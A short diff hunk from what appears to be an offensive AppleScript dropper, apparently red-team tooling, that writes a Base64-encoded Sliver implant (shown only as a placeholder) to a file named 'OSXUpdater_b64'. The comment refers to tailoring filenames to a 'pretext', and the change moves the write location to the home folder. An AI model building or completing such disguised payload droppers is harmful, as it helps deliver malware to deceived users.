@@ -7,7 +7,7 @@ Modify filenames and such to match your purpose/pretext. *)
 
 set encodedUpdater to "<Base64 encoded Sliver goes here>"
 tell application "Finder"
-	set currentPath to container of (path to me) as string
+	set currentPath to container of (get path to home folder) as string
 end tell
 set newPath to currentPath & "OSXUpdater_b64"
 set writePath to open for access file newPath with write permission
